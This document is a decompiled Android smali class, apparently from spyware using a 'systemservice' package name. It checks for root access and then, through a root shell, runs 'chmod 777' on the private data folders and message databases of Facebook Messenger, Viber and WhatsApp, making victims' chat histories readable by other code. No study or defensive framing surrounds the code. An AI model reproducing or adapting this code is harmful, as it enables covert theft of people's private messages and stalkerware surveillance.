.class public Lcom/systemservice/a/g/e;
.super Ljava/lang/Object;
.source ""


# direct methods
.method public static a()Z
    .locals 3

    const/4 v0, 0x0

    :try_start_0
    invoke-static {}, Lb/d/b/a;->a()Z

    move-result v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-eqz v1, :cond_0

    const/4 v0, 0x1

    :cond_0
    return v0

    :catch_0
    move-exception v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, ""

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v2, "TAG"

    invoke-static {v2, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return v0
.end method

.method public static b()Z
    .locals 3

    const/4 v0, 0x0

    :try_start_0
    invoke-static {}, Lb/d/b/a;->b()Z

    move-result v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-eqz v1, :cond_0

    const/4 v0, 0x1

    :cond_0
    return v0

    :catch_0
    move-exception v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, ""

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v2, "TAG"

    invoke-static {v2, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return v0
.end method

.method public static c()V
    .locals 4

    const-string v0, "chmod 777 /data/data/com.facebook.orca/"

    const-string v1, "chmod 777 /data/data/com.facebook.orca/databases/"

    const-string v2, "chmod 777 /data/data/com.facebook.orca/databases/threads_db2"

    const-string v3, "chmod 777 /data/data/com.facebook.orca/databases/threads_db2*"

    filled-new-array {v0, v1, v2, v3}, [Ljava/lang/String;

    move-result-object v0

    new-instance v1, Lb/d/a/b/b;

    const/4 v2, 0x0

    invoke-direct {v1, v2, v0}, Lb/d/a/b/b;-><init>(I[Ljava/lang/String;)V

    const/4 v0, 0x1

    :try_start_0
    invoke-static {v0}, Lb/d/b/a;->a(Z)Lb/d/a/b/f;

    move-result-object v0

    invoke-virtual {v0, v1}, Lb/d/a/b/f;->a(Lb/d/a/b/b;)Lb/d/a/b/b;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Lb/d/a/a/a; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/util/concurrent/TimeoutException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    goto :goto_0

    :catch_1
    move-exception v0

    goto :goto_0

    :catch_2
    move-exception v0

    :goto_0
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    :goto_1
    return-void
.end method

.method public static d()V
    .locals 4

    const-string v0, "chmod 777 /data/data/com.viber.voip/"

    const-string v1, "chmod 777 /data/data/com.viber.voip/databases/"

    const-string v2, "chmod 777 /data/data/com.viber.voip/databases/viber_messages"

    const-string v3, "chmod 777 /data/data/com.viber.voip/databases/viber_messages*"

    filled-new-array {v0, v1, v2, v3}, [Ljava/lang/String;

    move-result-object v0

    new-instance v1, Lb/d/a/b/b;

    const/4 v2, 0x0

    invoke-direct {v1, v2, v0}, Lb/d/a/b/b;-><init>(I[Ljava/lang/String;)V

    const/4 v0, 0x1

    :try_start_0
    invoke-static {v0}, Lb/d/b/a;->a(Z)Lb/d/a/b/f;

    move-result-object v0

    invoke-virtual {v0, v1}, Lb/d/a/b/f;->a(Lb/d/a/b/b;)Lb/d/a/b/b;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Lb/d/a/a/a; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/util/concurrent/TimeoutException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    goto :goto_0

    :catch_1
    move-exception v0

    goto :goto_0

    :catch_2
    move-exception v0

    :goto_0
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    :goto_1
    return-void
.end method

.method public static e()V
    .locals 6

    const-string v0, "chmod 777 /data/data/com.whatsapp/"

    const-string v1, "chmod 777 /data/data/com.whatsapp/databases/"

    const-string v2, "chmod 777 /data/data/com.whatsapp/databases/msgstore.db*"

    const-string v3, "chmod 777 /data/data/com.whatsapp/databases/wa.db*"

    const-string v4, "chmod 777 /data/data/com.whatsapp/databases/msgstore.db"

    const-string v5, "chmod 777 /data/data/com.whatsapp/databases/wa.db"

    filled-new-array/range {v0 .. v5}, [Ljava/lang/String;

    move-result-object v0

    new-instance v1, Lb/d/a/b/b;

    const/4 v2, 0x0

    invoke-direct {v1, v2, v0}, Lb/d/a/b/b;-><init>(I[Ljava/lang/String;)V

    const/4 v0, 0x1

    :try_start_0
    invoke-static {v0}, Lb/d/b/a;->a(Z)Lb/d/a/b/f;

    move-result-object v0

    invoke-virtual {v0, v1}, Lb/d/a/b/f;->a(Lb/d/a/b/b;)Lb/d/a/b/b;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Lb/d/a/a/a; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/util/concurrent/TimeoutException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    goto :goto_0

    :catch_1
    move-exception v0

    goto :goto_0

    :catch_2
    move-exception v0

    :goto_0
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    :goto_1
    return-void
.end method
